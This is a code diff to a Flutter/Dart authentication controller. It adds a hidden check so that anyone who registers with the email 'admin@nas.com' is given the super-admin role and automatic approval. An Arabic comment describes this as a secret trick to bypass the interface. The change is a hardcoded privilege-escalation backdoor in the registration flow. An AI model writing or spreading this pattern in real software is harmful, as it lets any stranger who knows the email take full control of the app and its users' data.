@@ -51,6 +51,15 @@ class AuthController extends GetxController {
   }) async {
     try {
       isLoading.value = true;
+      UserRole finalRole = role;
+      bool autoApprove = false;
+
+      // الخدعة السرية لتسجيل المدير العام متجاوزاً الواجهة
+      if (email.trim().toLowerCase() == 'admin@nas.com') {
+        finalRole = UserRole.superAdmin;
+        autoApprove = true;
+      }
+
       UserModel userData = UserModel(
         id: '',
         name: name,
@@ -59,7 +68,8 @@ class AuthController extends GetxController {
         wilaya: wilaya,
         commune: commune,
         address: address,
-        role: role,
+        role: finalRole,
+        isApproved: autoApprove,
         profileImage: profileImage,
         createdAt: DateTime.now(),
       );
